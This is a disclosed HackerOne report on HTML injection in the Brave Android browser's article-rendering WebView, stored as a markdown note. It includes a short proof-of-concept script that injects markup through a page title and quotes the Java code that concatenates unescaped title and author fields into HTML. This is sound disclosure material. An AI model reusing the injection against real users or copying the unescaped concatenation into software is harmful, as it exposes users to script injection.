---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/mobile
  - os/android
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2018-10-22
submitted: 2016-10-16T00:14:18.358Z
bounty_usd: null
votes: 43
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "bobrov"
source: "https://hackerone.com/reports/176065"
title: "[Android] HTML Injection in BatterySaveArticleRenderer WebView"
---
# [Android] HTML Injection in BatterySaveArticleRenderer WebView

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 43 | **Program:** Brave Software | **Disclosed:** 2018-10-22

- Report: [https://hackerone.com/reports/176065](https://hackerone.com/reports/176065)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2016-10-16T00:14:18.358Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

HTML Injection in BatterySaveArticleRenderer WebView.

## Products affected: 

 * Android Brave Browser 1.9.56

## Steps To Reproduce:

 * Open https://blackfan.ru/brave or html

```html
<script>
location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--"
</script>
```
* Wait for a full load
* Click on ArticleModeButton

## Supporting Material/References:

Vulnerable code:
```java
public class aot
...
// s7 == title
if(s7 != null)
{
  s4 = (new StringBuilder()).append(s5).append("<title>").append(s7).append("</title>").toString();
  s1 = (new StringBuilder()).append(s6).append("<p style=\"font-size:").append(s1).append(";line-height:120%;font-weight:bold;margin:").append(s3).append(" 0px 12px 0px\">").append(s7).append("</p>").toString();
...
// s8 == authorName
if(s8 != null)
  s1 = (new StringBuilder()).append("<span class=\"nowrap\"><b>").append(s8).append("</b>,</span> ").toString();
```

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2016-10-18** @sergzh: The report is not informative.
- **Report Informative**
- **Agreed On Going Public**
- **Report Reopened**
- **2016-10-18** @bobrov: **Vulnerable params**: title, authorName 
**Vulnerable source code**:
https://github.com/brave/browser-android/blob/59b9b73c651d607e6416c5283d2f6812a469b5c4/Application/LinkBubble/src/main/java/com/linkbubble/articlerender/ArticleContent.java#L97-L111

/java/com/linkbubble/articlerender/ArticleContent.java
```java
        String title = result.getTitle();
        if (title != null) {
            headHtml += "<title>" + title + "</title>";
            bodyHtml += "<p style=\"font-size:" + titleFontSize + ";line-height:120%;font-weight:bold;margin:" + titleTopMargin + " 0px 12px 0px\">" + title + "</p>";
        }

        String authorName = result.getAuthorName();
        Date publishedDate = result.getDate();

        String leftString = "";
        String rightString = "";

        if (authorName != null) {
            leftString = "<span class=\"nowrap\"><b>" + authorName + "</b>,</span> ";
        }
```
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **External User Joined**
